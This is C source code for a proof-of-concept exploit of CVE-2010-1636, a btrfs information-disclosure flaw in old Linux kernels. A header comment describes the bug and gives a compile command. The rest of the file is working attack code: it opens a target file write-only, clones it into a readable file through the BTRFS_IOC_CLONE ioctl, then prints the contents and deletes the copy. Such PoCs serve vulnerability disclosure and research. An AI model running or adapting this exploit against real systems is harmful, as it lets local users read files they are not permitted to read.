/*
 * btrfs-cve-2010-1636.c
 *
 * Btrfs ioctl clone information disclosure vulnerability PoC
 *
 * The btrfs_ioctl_clone function in fs/btrfs/ioctl.c in the Linux
 * kernel 2.6.29-git9 through 2.6.32-rc5-next-20091028 does not
 * check whether the source file is opened for reading, which
 * allows local users to read arbitrary file content by creating
 * a write-only file descriptor.
 *
 * gcc -o btrfs-cve-2010-1636 btrfs-cve-2010-1636.c
 *
 * Author:
 *   Jon Oberheide <jon@oberheide.org>
 *   http://jon.oberheide.org
 *
 * CVE-2010-1636
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>

#define BTRFS_IOCTL_MAGIC 0x94
#define BTRFS_IOC_CLONE _IOW(BTRFS_IOCTL_MAGIC, 9, int)

int
main(int argc, char **argv)
{
    int src, dst;
    char buf[1024];

    if (argc != 3) {
        printf("Usage: %s <src> <dst>\n", argv[0]);
        return 1;
    }

    /* create dummy destination file */
    if ((dst = open(argv[2], O_WRONLY | O_CREAT, 0644)) < 0) {
        perror("open");
        return 1;
    }
    close(dst);

    /* open destination file for real */
    if ((dst = open(argv[2], O_WRONLY)) < 0) {
        perror("open");
        return 1;
    }

    /* open source file write-only */
    if ((src = open(argv[1], O_WRONLY)) < 0) {
        perror("open");
        return 1;
    }

    /* pew pew pew */
    if (ioctl(dst, BTRFS_IOC_CLONE, src) < 0) {
        perror("ioctl");
        return 1;
    }

    close(src);
    close(dst);

    /* behold the fruits of our labor */
    if ((dst = open(argv[2], O_RDONLY)) < 0) {
        perror("open");
        return 1;
    }

    memset(buf, 0, sizeof(buf));
    read(dst, buf, sizeof(buf) - 1);
    printf("%s\n", buf);

    close(dst);
    unlink(argv[2]);

    return 0;
}
